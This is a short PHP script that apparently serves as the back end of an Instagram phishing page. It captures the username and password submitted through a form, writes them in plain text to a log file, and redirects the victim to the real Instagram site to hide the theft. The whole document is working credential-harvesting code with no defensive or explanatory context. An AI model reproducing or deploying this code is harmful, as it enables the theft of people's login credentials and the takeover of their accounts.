$username = $_POST["username"];
$password = $_POST["password"];

$fp = fopen("log.txt", "a");
fwrite($fp,"Username: " . $username);
fwrite($fp,"password: " . $password);
fclose($fp);

header("Location: https://instagram.com");
